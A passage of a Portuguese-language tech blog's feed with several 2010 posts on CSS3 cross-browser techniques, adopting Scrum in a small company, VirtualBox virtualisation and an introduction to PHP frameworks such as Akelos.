suporte às principais propriedades do &lt;em&gt;CSS3&lt;/em&gt;. Mas vale ressaltar que …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Enquanto o &lt;a href="https://klauslaube.com.br/2010/11/13/usando-html5-sem-medo.html" title="Usando o HTML5 sem medo"&gt;movimento em prol do HTML5 ganha cada vez mais força&lt;/a&gt;, o
que podemos falar do &lt;a href="https://klauslaube.com.br/tag/css3.html" title="Leia mais sobre CSS3"&gt;&lt;em&gt;CSS3&lt;/em&gt;&lt;/a&gt;?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Para a nossa felicidade, &lt;em&gt;Opera&lt;/em&gt;, &lt;em&gt;Safari&lt;/em&gt;, &lt;em&gt;Google Chrome&lt;/em&gt;, &lt;em&gt;Firefox&lt;/em&gt; e
(o polêmico) &lt;em&gt;IE9&lt;/em&gt; já apresentam (ou apresentarão, no caso do &lt;em&gt;IE&lt;/em&gt;) bom
suporte às principais propriedades do &lt;em&gt;CSS3&lt;/em&gt;. Mas vale ressaltar que,
assim como o &lt;a href="https://klauslaube.com.br/tag/html5.html" title="Leia mais sobre HTML5"&gt;&lt;em&gt;HTML5&lt;/em&gt;&lt;/a&gt; o &lt;em&gt;CSS3&lt;/em&gt; é apenas um “draft“… os navegadores
suportam algumas características através de expressões proprietárias
(então a cautela neste caso também é necessária).&lt;/p&gt;
&lt;p&gt;Isto pode (e deve) ser encarado de uma forma muito negativa. Mas temos
que entender que estas expressões proprietárias estão calcadas em
especificações do &lt;em&gt;W3C&lt;/em&gt;, ou seja, é bem provável que o &lt;code&gt;border-radius&lt;/code&gt;
do &lt;em&gt;Firefox&lt;/em&gt; (realizado através da expressão &lt;code&gt;-moz-border-radius&lt;/code&gt;) irá
reproduzir um efeito similar ao &lt;code&gt;border-radius&lt;/code&gt; do &lt;em&gt;Chrome&lt;/em&gt; (que já
segue a especificação do &lt;em&gt;W3C&lt;/em&gt;). A dica que eu dou é a seguinte: Utilize
&lt;a href="http://www.tableless.com.br/graceful-degradation-e-tudo-sobre-acessibilidade" title="Graceful degradation é tudo sobre Acessibilidade"&gt;&lt;em&gt;Graceful Degradation&lt;/em&gt;&lt;/a&gt;, ou seja, &lt;strong&gt;escreva seus estilos com
&lt;em&gt;CSS3&lt;/em&gt;&lt;/strong&gt;, e vá &lt;strong&gt;adicionando exceções para suportar os demais
navegadores&lt;/strong&gt; que não suportam certas propriedades.&lt;/p&gt;
&lt;p&gt;Vamos ao que interessa?!&lt;/p&gt;
&lt;h2&gt;CSS3 Please!&lt;/h2&gt;
&lt;p&gt;O site &lt;a href="http://css3please.com/" title="Saiba como fazer CSS3 Cross-Browser"&gt;&lt;em&gt;CSS3 Please! The Cross-Browser CSS3 Rule Generator&lt;/em&gt;&lt;/a&gt; nos
ensina como fazer &lt;code&gt;border-radius&lt;/code&gt;, &lt;code&gt;box-shadow&lt;/code&gt;, &lt;code&gt;transform&lt;/code&gt;,
&lt;code&gt;transition&lt;/code&gt;, &lt;code&gt;text-shadow&lt;/code&gt; e &lt;code&gt;font-face&lt;/code&gt;; de forma muito simples
e prática, e que funcione no &lt;em&gt;Safari&lt;/em&gt;, &lt;em&gt;Chrome&lt;/em&gt;, &lt;em&gt;Opera&lt;/em&gt; e &lt;em&gt;Firefox&lt;/em&gt; (e
algumas propriedades até no &lt;em&gt;IE&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;É uma referência muito interessante que deve estar sempre disponível
para quando bater aquela dúvida. Podemos reparar que são (na maioria dos
casos) expressões proprietárias, mas que atingem a experiência obtida
utilizando uma expressão &lt;em&gt;standard&lt;/em&gt; (como no caso do &lt;code&gt;border-radius&lt;/code&gt;).&lt;/p&gt;
&lt;h2&gt;CSS3 PIE&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;CSS3 Please!&lt;/em&gt; já quebra um bom galho na utilização de alguns recursos
do &lt;em&gt;CSS3&lt;/em&gt;. Mas no caso do &lt;em&gt;IE&lt;/em&gt;, algumas propriedades como
&lt;code&gt;border-radius&lt;/code&gt; e &lt;code&gt;box-shadow&lt;/code&gt; (que no meu caso são as propriedades
mais “salva-vidas” da linguagem) não possuem alternativas.&lt;/p&gt;
&lt;p&gt;O site &lt;a href="http://css3pie.com/" title="CSS3 decorations for IE"&gt;&lt;em&gt;CSS3 PIE&lt;/em&gt;&lt;/a&gt; apresenta uma forma de utilizar estas propriedades
sem precisar utilizar &lt;em&gt;PNGs&lt;/em&gt; com transparência. Através de um arquivo
&lt;strong&gt;.htc&lt;/strong&gt; importado na folha de estilo, podemos fazer com que o &lt;em&gt;IE&lt;/em&gt; (do
6 ao 8 ) possa compreender as seguintes propriedades:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;border-radius&lt;/li&gt;
&lt;li&gt;box-shadow&lt;/li&gt;
&lt;li&gt;border-image&lt;/li&gt;
&lt;li&gt;Múltiplas imagens de fundo (background images)&lt;/li&gt;
&lt;li&gt;Gradiente como fundo (linear-gradient as background image)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Já é uma boa economia de trabalho, não?&lt;/p&gt;
&lt;h2&gt;jQuery e Graceful Degradation&lt;/h2&gt;
&lt;p&gt;Recentemente o &lt;em&gt;Tableless&lt;/em&gt; fez um &lt;a href="http://www.tableless.com.br/jquery-para-layouts" title="jQuery para produção de layouts"&gt;excelente &lt;em&gt;post&lt;/em&gt;&lt;/a&gt; sobre como usar a
&lt;a href="https://klauslaube.com.br/tag/jquery.html"&gt;&lt;em&gt;jQuery&lt;/em&gt;&lt;/a&gt; como meio de fazer alguns navegadores lidarem da melhor
forma possível com novos recursos do &lt;em&gt;CSS3&lt;/em&gt; e &lt;em&gt;HTML5&lt;/em&gt;. Sempre fui muito
a favor da visão deles e dessa vez não será diferente.&lt;/p&gt;
&lt;p&gt;Nivelar por baixo pode ser uma excelente forma de garantir
acessibilidade. Mas não é pecado “vendermos” um pouco de “boa
experiência” para nossos usuários.&lt;/p&gt;
&lt;p&gt;Enriquecer a experiência do usuário não é crime… esquecer da
acessibilidade sim.&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="padroes-web"></category><category term="css3"></category><category term="graceful-degradation"></category><category term="html5"></category></entry><entry><title>SCRUM: Como encontrei a felicidade gerenciando prazos</title><link href="https://klauslaube.com.br/2010/12/09/scrum-como-encontrei-felicidade-gerenciando-prazos.html" rel="alternate"></link><published>2010-12-09T12:53:00-02:00</published><updated>2010-12-09T12:53:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2010-12-09:/2010/12/09/scrum-como-encontrei-felicidade-gerenciando-prazos.html</id><summary type="html">&lt;p&gt;Eu como desenvolvedor nunca tive real interesse em
gerência de projetos, o que fatalmente resultava em projetos de
qualidade duvidosa e fora de prazo. Devo confidenciar que até hoje não
tenho interesse no modelo “tradicional” de gerenciar projetos de
&lt;em&gt;software&lt;/em&gt;, mas a preocupação com a qualidade, prazos e escopo acabou …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Eu como desenvolvedor nunca tive real interesse em
gerência de projetos, o que fatalmente resultava em projetos de
qualidade duvidosa e fora de prazo. Devo confidenciar que até hoje não
tenho interesse no modelo “tradicional” de gerenciar projetos de
&lt;em&gt;software&lt;/em&gt;, mas a preocupação com a qualidade, prazos e escopo acabou
por fazer parte do meu cotidiano quando abri minha própria empresa de
desenvolvimento.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;&lt;em&gt;Startups&lt;/em&gt; geralmente são compostas por equipes pequenas, e estas
devem ser &lt;strong&gt;multidisciplinares&lt;/strong&gt;. Acredito que o “desenvolvedor
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;” atualmente é mais do que aquele “feijão com arroz” do início
dos anos 2000. Hoje temos a obrigação de saber o mínimo possível de cada
área de conhecimento que envolve o desenvolvimento de &lt;em&gt;software&lt;/em&gt;: desde
&lt;em&gt;design&lt;/em&gt; de interfaces à modelagem de entidades e relacionamentos em um
banco de dados (ou seja, verdadeiros Engenheiros de &lt;em&gt;Software&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Um dia eu disse “chega” ao caos, e decidi que meus projetos de agora em
diante deveriam possuir prazos bem definidos e acima de tudo
qualidade. O meu primeiro passo foi procurar ferramentas, e esse foi
o meu maior erro. Não se trata de ferramentas ou processos… &lt;strong&gt;trata-se
de pessoas e atitude!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Eu me sinto na obrigação de falar sobre &lt;a href="https://klauslaube.com.br/tag/scrum.html" title="Leia mais sobre Scrum"&gt;&lt;em&gt;Scrum&lt;/em&gt;&lt;/a&gt; antes mesmo de falar
sobre camadas de desenvolvimento &lt;em&gt;web&lt;/em&gt;, ambientes de desenvolvimento
&lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; / &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, ou sobre testes automatizados.&lt;/p&gt;
&lt;h2&gt;Trata-se de pessoas…&lt;/h2&gt;
&lt;p&gt;Se você não sabe o que é &lt;em&gt;Scrum&lt;/em&gt;, recomendo:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Primeiramente assitir ao vídeo “&lt;a href="http://www.youtube.com/watch?v=Q5k7a9YEoUI&amp;amp;feature=player_embedded" title="Aprenda Scrum em 10 minutos no Youtube"&gt;&lt;em&gt;Scrum under 10 minutes&lt;/em&gt;&lt;/a&gt;“;&lt;/li&gt;
&lt;li&gt;Após esta divertida introdução, ver &lt;em&gt;Scrum&lt;/em&gt; no mundo real assistindo
    ao &lt;a href="http://remoteprocedurecall.wordpress.com/2009/05/22/scrum-na-globo/" title="Scrum na Globo.com"&gt;depoimento sobre como ele é usado na &lt;em&gt;Globo.com&lt;/em&gt;&lt;/a&gt;;&lt;/li&gt;
&lt;li&gt;Por fim, recomendo ler o &lt;em&gt;e-book&lt;/em&gt; “&lt;a href="http://www.infoq.com/minibooks/scrum-xp-from-the-trenches" title="Faça download do e-book. Necessário cadastro"&gt;&lt;em&gt;Scrum&lt;/em&gt; e &lt;em&gt;XP&lt;/em&gt; direto das
    trincheiras&lt;/a&gt;” (sem dúvida a minha refência favorita sobre Scrum).&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/scrum.jpg" width="416" height="300" title="Formação Scrum, no Rugby" alt="Formação Scrum, no Rugby"&gt;&lt;/p&gt;
&lt;p&gt;Posso afirmar que o grande lance do
&lt;em&gt;Scrum&lt;/em&gt; é &lt;strong&gt;aproximar as pessoas envolvidas em um projeto&lt;/strong&gt; removendo o
que não importa. É tirá-las de baias, fazê-las pararem de ficar enviando
&lt;em&gt;e-mails&lt;/em&gt; umas para as outras, botar estas pessoas numa sala e fazer com
que se conversem como seres humanos normais.&lt;/p&gt;
&lt;p&gt;Particularmente, detesto o &lt;em&gt;face-to-face&lt;/em&gt;. Mas me aproximar do cliente
foi uma experiência muito agradável que só me trouxe benefícios. Agora
eu sabia exatamente qual era a necessidade dele. O &lt;em&gt;Scrum&lt;/em&gt; me
possibilitou isso removendo pilhas de documentos e processos do caminho,
mostrando que para você entender qual é o problema do cliente é
necessário comunicação.&lt;/p&gt;
&lt;h2&gt;Foco garante agilidade&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/scrum-iteration.png" width="120" height="120" title="Iterações de projetos Scrum" alt="Iterações de projetos Scrum"&gt;&lt;/p&gt;
&lt;p&gt;Sabendo exatamente qual era a necessidade do cliente, foi possível determinar
o que era mais importante para o mesmo. O modelo de desenvolvimento iterativo
permite que os desenvolvedores de &lt;em&gt;software&lt;/em&gt; possam entregar &lt;strong&gt;pequenas partes usáveis&lt;/strong&gt;
de seu sistema para o cliente. Através de pequenas tarefas priorizadas pelo próprio,
podemos gerar valor mesmo durante o processo de desenvolvimento (ao
contrário do modelo cascata onde a aplicação só irá gerar valor ao
término do desenvolvimento).&lt;/p&gt;
&lt;p&gt;O modelo de pequenas entregas trouxe algumas vantagens para o meu
ambiente de trabalho:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Escopo bem definido:&lt;/strong&gt; Nos preocupávamos com pequenos grupos de
  funcionalidades por vez, garantindo um foco no que realmente
  importava ao cliente naquela etapa de desenvolvimento do projeto.
  Com as propostas do &lt;em&gt;Scrum&lt;/em&gt; para gerência de estórias, o
  conhecimento era sempre explícito (ou seja, todos da equipe sabem
  exatamente o que deve ser feito);&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Flexibilidade:&lt;/strong&gt; Em um pequeno projeto, percebi que a maneira
  determinada inicialmente para resolver um problema específico era
  ineficaz. O modelo iterativo me permitiu mudar o andamento do
  desenvolvimento (através da utilização do &lt;em&gt;Backlog&lt;/em&gt; e de &lt;em&gt;Sprint
  Plannings&lt;/em&gt;);&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Qualidade acima de tudo:&lt;/strong&gt; Com os &lt;em&gt;feedbacks&lt;/em&gt; rápidos foi possível
  captar o sentimento do cliente em relação ao projeto. Com ele
  próximo a equipe fica muito mais fácil negociar escopo e garantir
  qualidade. Já li em alguns lugares que muitas vezes o fim do prazo
  do projeto não fora atingido mas o cliente já estava totalmente
  feliz com a solução… na verdade o cliente só vai saber o que quer
  quando mostrarmos algo a ele.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Conhecendo o escopo, tendo uma equipe “sincronizada”, tendo o poder de
negociar escopo e coletando &lt;em&gt;feedbacks&lt;/em&gt; rápidos do cliente; além de
&lt;strong&gt;qualidade&lt;/strong&gt; ganhamos o que falta no modelo tradicional de
desenvolvimento de &lt;em&gt;software&lt;/em&gt;: &lt;strong&gt;agilidade&lt;/strong&gt;. Esta me permitiu entregar
o escopo prometido (e negociado durante o desenvolvimento) dentro do
prazo prometido (que influenciou diretamente na negociação do escopo)
sem denegrir qualidade.&lt;/p&gt;
&lt;p&gt;O cliente ganha, o desenvolvedor ganha e as famílias dos desenvolvedores
também ganham =D&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Se você achou o &lt;em&gt;Scrum&lt;/em&gt; burocrático demais para a sua empresa (garanto
que terão pessoas que o acharão), recomendo a leitura do &lt;em&gt;e-Book&lt;/em&gt;
“&lt;a href="http://gettingreal.37signals.com/GR_por.php" title="Leia "&gt;&lt;em&gt;Getting Real&lt;/em&gt;&lt;/a&gt;” do pessoal da &lt;a href="http://37signals.com/" title="Os produtos da 37Signals são referências para todas as Startups de tecnologia"&gt;&lt;em&gt;37 Signals&lt;/em&gt;&lt;/a&gt;.
Já para aqueles que acharam o &lt;em&gt;Scrum&lt;/em&gt; “anárquico” demais, recomendo conhecer a &lt;a href="http://pt.wikipedia.org/wiki/Programa%C3%A7%C3%A3o_extrema" title="Leia mais sobre eXtreme Programming no Wikipedia"&gt;&lt;em&gt;eXtreme
Programming&lt;/em&gt;&lt;/a&gt; (&lt;a href="http://improveit.com.br/xp" title="Uma documentação muito rica sobre XP"&gt;este artigo da &lt;em&gt;ImproveIT&lt;/em&gt; está sensacional!&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Não acho o &lt;em&gt;agile&lt;/em&gt; uma solução ”bala de prata”. Acredito que os
processos devam ser moldados de acordo com a realidade de cada
instituição. Mas tenha em mente, este conceito de “fábrica de &lt;em&gt;Software&lt;/em&gt;”
já perdeu muito do seu prestígio, e hoje quase virou sinônimo de
“projetos atrasados”.&lt;/p&gt;
&lt;p&gt;Para mim funcionou muito bem, mesmo depois de fechar a minha empresa
(não foi culpa do &lt;em&gt;Scrum&lt;/em&gt; (: ) e aplicar estes conceitos em meus
projetos &lt;em&gt;freelancer&lt;/em&gt;.&lt;/p&gt;</content><category term="agile"></category><category term="scrum"></category><category term="gerencia-de-projetos"></category></entry><entry><title>Virtualbox: Uma maneira interessante de possuir vários SOs em uma máquina só</title><link href="https://klauslaube.com.br/2010/12/01/virtualbox-varios-sos-numa-maquina-so.html" rel="alternate"></link><published>2010-12-01T21:14:00-02:00</published><updated>2010-12-01T21:14:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2010-12-01:/2010/12/01/virtualbox-varios-sos-numa-maquina-so.html</id><summary type="html">&lt;p&gt;Sabe quando você quer testar uma distribuição (ou &lt;em&gt;SO&lt;/em&gt;) diferente mas não quer mexer diretamente no
particionamento do seu &lt;em&gt;HD&lt;/em&gt;? Ou quando você precisar propor uma máquina
individual para serviços &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, mas não tem &lt;em&gt;hardware&lt;/em&gt; sobrando para
isto? Ou quando você precisa ficar movendo um ambiente completo entre
máquinas ou …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Sabe quando você quer testar uma distribuição (ou &lt;em&gt;SO&lt;/em&gt;) diferente mas não quer mexer diretamente no
particionamento do seu &lt;em&gt;HD&lt;/em&gt;? Ou quando você precisar propor uma máquina
individual para serviços &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;, mas não tem &lt;em&gt;hardware&lt;/em&gt; sobrando para
isto? Ou quando você precisa ficar movendo um ambiente completo entre
máquinas ou locais?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Virtualização pode ser a resposta para os seus problemas!&lt;/p&gt;
&lt;h2&gt;Virtualização? What the hell?&lt;/h2&gt;
&lt;p&gt;Segundo o nosso bom e velho &lt;a href="http://pt.wikipedia.org/wiki/Virtualiza%C3%A7%C3%A3o" title="Leia mais sobre Virtualização na Wikipedia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt;, virtualização é:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(…) uma forma de esconder as características físicas de uma plataforma
computacional dos utilizadores, mostrando outro hardware virtual,
emulando um ou mais ambientes isolados.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Em outras palavras, é a capacidade de você executar um ou mais sistemas
operacionais através de plataformas que são emuladas através de um
segundo sistema operativo… não ajudei né? Então vamos para a forma
“vulgar”:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;É o conceito ou &lt;em&gt;software&lt;/em&gt; que permite a você executar &lt;em&gt;Ubuntu&lt;/em&gt;, &lt;em&gt;Mac OS
X&lt;/em&gt; e &lt;em&gt;FreeBSD&lt;/em&gt; em seu &lt;em&gt;Windows XP&lt;/em&gt; sem necessitar particionar seu &lt;em&gt;HD&lt;/em&gt;,
e ao mesmo tempo. Neste caso, um &lt;em&gt;hardware&lt;/em&gt; virtual é criado e você
opera (instala, configura, usa) o &lt;em&gt;SO&lt;/em&gt; normalmente, como se estivesse em
uma “máquina física”.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;O &lt;a href="http://pt.wikipedia.org/wiki/Virtualiza%C3%A7%C3%A3o" title="Leia mais sobre Virtualização na Wikipedia"&gt;artigo no &lt;em&gt;Wikipedia&lt;/em&gt; sobre virtualização&lt;/a&gt; está bem
bacana, inclusive citando vantagens e inconvenientes.&lt;/p&gt;
&lt;h2&gt;O Virtualbox&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/virtualbox-logo.png" width="174" height="180" title="Logotipo do Virtualbox" alt="Logotipo do Virtualbox"&gt;&lt;/p&gt;
&lt;p&gt;Existem diversas formas e ferramentas para virtualizar ambientes em seu &lt;em&gt;desktop&lt;/em&gt;
ou servidor. A ferramenta que tenho utilizado com muito sucesso
(em meu &lt;em&gt;desktop&lt;/em&gt;, sou programador e não &lt;em&gt;expert&lt;/em&gt; em infra (: ) é o
&lt;strong&gt;&lt;em&gt;Virtualbox&lt;/em&gt;&lt;/strong&gt; (também chamado de &lt;strong&gt;&lt;em&gt;Virtualbox OSE&lt;/em&gt;&lt;/strong&gt;).&lt;/p&gt;
&lt;p&gt;Hoje mantido pela &lt;em&gt;Oracle&lt;/em&gt; (que adquiriu a &lt;em&gt;Sun Microsystems&lt;/em&gt;), o
&lt;em&gt;Virtualbox&lt;/em&gt; é uma solução ágil e objetiva no que diz respeito a
virtualização. Não sei a opinião dos profissionais de infraestrutura
sobre esta ferramenta, mas já passei por duas empresas especializadas em
serviços/produtos focados em servidores, e o &lt;em&gt;Virtualbox&lt;/em&gt; estava lá
atendendo a demanda.&lt;/p&gt;
&lt;p&gt;O que me chamou a atenção foi a facilidade de uso. Como programador,
utilizo-o para criar &lt;em&gt;sandboxes&lt;/em&gt; e máquinas de testes. Na empresa onde
trabalho atualmente, utilizamos o programa para manter nossos
&lt;em&gt;workspaces&lt;/em&gt; isolados (já que a aplicação em que eu trabalho é
empacotada como uma verdadeira distribuição &lt;em&gt;Linux&lt;/em&gt;). Já no meu
computador pessoal, tenho &lt;em&gt;VMs&lt;/em&gt; (&lt;em&gt;Virtual Machines&lt;/em&gt; – Máquinas Virtuais)
para testar distribuições como o &lt;em&gt;Debian&lt;/em&gt;, &lt;em&gt;Slackware&lt;/em&gt; e até mesmo o
&lt;em&gt;Android&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Instalando o Virtualbox&lt;/h2&gt;
&lt;p&gt;Existem milhares de tutoriais que ensinam a instalar o &lt;em&gt;Virtualbox&lt;/em&gt;. Não
vou “reinventar a roda”… vou apenas indicar alguns tutoriais:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.vivaolinux.com.br/artigo/Instalando-o-VirtualBox-no-Ubuntu-10.04/" title="Artigo de Leandro Bruno para o Viva o Linux sobre Virtualbox no Ubuntu-10.04"&gt;&lt;em&gt;Viva o Linux&lt;/em&gt;: Instalando o &lt;em&gt;Virtualbox&lt;/em&gt; no &lt;em&gt;Ubuntu 10.04&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.vivaolinux.com.br/dica/Instalacao-do-Virtualbox-no-Debian-Etch-4-Linux" title="Artigo de Ronnie Robson Campos para o Viva o Linux sobre o Virtualbox no Debian Etch"&gt;&lt;em&gt;Viva o Linux&lt;/em&gt;: Instalação do &lt;em&gt;Virtualbox&lt;/em&gt; no &lt;em&gt;Debian (Etch)&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.brunorusso.eti.br/virtualizacao/instalando-o-virtualbox-em-uma-maquina-com-slackware/" title="Um excelente post de Bruno Russo sobre Virtualbox em Slackware"&gt;&lt;em&gt;Bruno Russo&lt;/em&gt;: Instalando o &lt;em&gt;Virtualbox&lt;/em&gt; em uma máquina com
  &lt;em&gt;Slackware&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blogdovicente.com/2009/03/04/como-instalar-e-usar-o-virtualbox/" title="Post feito pelo Vicente sobre o Virtualbox no Windows"&gt;&lt;em&gt;Blog do Vicente&lt;/em&gt;: Como instalar e usar o &lt;em&gt;Virtualbox&lt;/em&gt;
  (&lt;em&gt;Windows&lt;/em&gt;)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="infraestrutura"></category><category term="sistemas-operacionais"></category><category term="virtualizacao"></category><category term="virtualbox"></category></entry><entry><title>Agilidade em PHP: Conhecendo algumas frameworks – Parte 1</title><link href="https://klauslaube.com.br/2010/11/27/agilidade-em-php-conhecendo-algumas-frameworks.html" rel="alternate"></link><published>2010-11-27T13:21:00-02:00</published><updated>2010-11-27T13:21:00-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2010-11-27:/2010/11/27/agilidade-em-php-conhecendo-algumas-frameworks.html</id><summary type="html">&lt;p&gt;Embora eu me considere um admirador do &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, é o
&lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt; que vem “colocando comida na mesa”. É inegável a importância
desta linguagem para o meio &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;. Basta reparar que a grande parte
dos cursos focados nesta área têm o &lt;em&gt;PHP&lt;/em&gt; em sua grade.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Isto pode ser uma …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Embora eu me considere um admirador do &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;, é o
&lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt; que vem “colocando comida na mesa”. É inegável a importância
desta linguagem para o meio &lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt;. Basta reparar que a grande parte
dos cursos focados nesta área têm o &lt;em&gt;PHP&lt;/em&gt; em sua grade.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Isto pode ser uma “faca de dois gumes”, pois com a oferta de cursos em
&lt;em&gt;PHP&lt;/em&gt; em alta é normal que apareçam novos bons profissionais, e maus
profissionais (como em qualquer outra linguagem). Recentemente notei que
o profissional &lt;em&gt;PHP&lt;/em&gt; tem &lt;strong&gt;fama&lt;/strong&gt; de escrever &lt;strong&gt;“código ruim”&lt;/strong&gt; ou
“código cheirando mal”. Esta linguagem foi a minha porta de entrada para
o desenvolvimento &lt;em&gt;web&lt;/em&gt; (como é de muitos outros), e acredito que não
seja a linguagem que faça do profissional um mau programador…
experiência (e competência) adquirimos com tempo e prática.&lt;/p&gt;
&lt;p&gt;Resumindo, conheço profissionais &lt;em&gt;PHP&lt;/em&gt; que &lt;strong&gt;mandam muito bem&lt;/strong&gt;! Então
se você está começando… &lt;em&gt;PHP&lt;/em&gt; é sim uma ótima escolha (mas não limite-se
a ele).&lt;/p&gt;
&lt;p&gt;E vamos ao post ;)&lt;/p&gt;
&lt;h2&gt;Framework pra quê?&lt;/h2&gt;
&lt;p&gt;Sejamos sinceros. Quem já usou um &lt;em&gt;framework&lt;/em&gt; na vida sabe muito bem
como responder esta pergunta. Além do &lt;em&gt;set&lt;/em&gt; de funcionalidades “ready to
use“, temos os benefícios da organização, de algumas boas práticas de
segurança (em alguns casos), de testes automatizados, etc. Hoje, não me
vejo escrevendo um &lt;em&gt;software&lt;/em&gt; do zero… seria um total desperdício de
esforço e tempo.&lt;/p&gt;
&lt;p&gt;Se você está meio cético quanto a isso tudo, eu lanço o desafio:
Pergunte a qualquer usuário do &lt;em&gt;jQuery&lt;/em&gt; se o mesmo deixaria de usá-lo e
voltaria a desenvolver suas soluções com &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt; puro.&lt;/p&gt;
&lt;h2&gt;Botando o &lt;em&gt;PHP&lt;/em&gt; nos trilhos com &lt;em&gt;Akelos&lt;/em&gt;&lt;/h2&gt;
&lt;p&gt;&lt;img class="align-left" src="/images/blog/akelos-logo.jpg" width="180" height="180" title="Logotipo do framework Akelos" alt="Logotipo do framework Akelos"&gt;&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Akelos&lt;/em&gt; foi o primeiro &lt;em&gt;framework
PHP&lt;/em&gt; que eu experimentei. Na época (cerca de 2 anos atrás) ele tinha
sérios problemas com documentação e era um pouco “difícil de lidar”.&lt;/p&gt;
&lt;p&gt;A premissa do &lt;em&gt;Akelos&lt;/em&gt; é ser o &lt;strong&gt;&lt;em&gt;&lt;a href="http://rubyonrails.org/" title="Conheça a framework Ruby on Rails"&gt;Ruby on Rails&lt;/a&gt; do PHP&lt;/em&gt;&lt;/strong&gt;.
Inclusive, quem tem certa experiência com &lt;em&gt;RoR&lt;/em&gt; vai notar várias
similaridades entre ambos (na verdade é um verdadeiro “port” do &lt;em&gt;RoR&lt;/em&gt;
pro &lt;em&gt;PHP&lt;/em&gt;). Cheguei a publicar um projeto em &lt;em&gt;Akelos&lt;/em&gt;, e devo admitir
que na época tive um pouco de dificuldade… talvez hoje ele esteja mais
maduro.&lt;/p&gt;
&lt;p&gt;O que eu realmente gostei nele foi o esquema de “admin generator”
semelhante ao do &lt;em&gt;Django&lt;/em&gt;, seu poderoso esquema de &lt;em&gt;scaffolding&lt;/em&gt; e a
postura humilde dos desenvolvedores de indicarem outros &lt;em&gt;frameworks&lt;/em&gt; na
sua página oficial.&lt;/p&gt;
